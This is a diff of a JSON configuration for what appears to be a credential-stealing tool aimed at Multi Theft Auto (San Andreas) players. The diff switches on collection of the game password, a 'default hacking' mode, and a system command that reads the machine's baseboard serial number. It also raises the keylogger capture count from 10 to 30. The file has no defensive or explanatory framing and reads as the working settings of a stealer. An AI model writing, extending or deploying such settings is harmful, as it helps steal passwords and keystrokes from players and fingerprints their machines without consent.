@@ -4,12 +4,12 @@
   
   "Hacking":{
   "Enable":true,
-  "NeedMTAPass":false,
-  "NeedCommand":false,
+  "NeedMTAPass":true,
+  "NeedCommand":true,
   "Command":"wmic baseboard get serialnumber",
-  "NeedDefaultHacking":false,
+  "NeedDefaultHacking":true,
   "MTApath":"C:\\Program Files (x86)\\MTA San Andreas 1.6",
   "MTAfileName":"F32266",
   "NeedKeyLogger":true,
-  "KeyLogCount":10}
+  "KeyLogCount":30}
 }
